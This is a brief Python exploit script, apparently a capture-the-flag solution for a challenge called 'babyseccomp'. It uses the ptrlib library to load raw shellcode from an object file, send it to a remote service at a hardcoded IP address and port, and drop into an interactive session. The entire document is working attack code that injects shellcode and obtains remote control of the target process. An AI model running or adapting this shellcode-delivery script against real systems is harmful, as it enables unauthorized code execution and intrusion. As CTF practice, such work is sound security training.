from ptrlib import *

with open("shellcode.o", "rb") as f:
    f.seek(0x180)
    shellcode = f.read()

#sock = Process("./babyseccomp")
sock = Socket("115.68.235.72", 23457)
sock.sendafter(": ", shellcode)
sock.interactive()
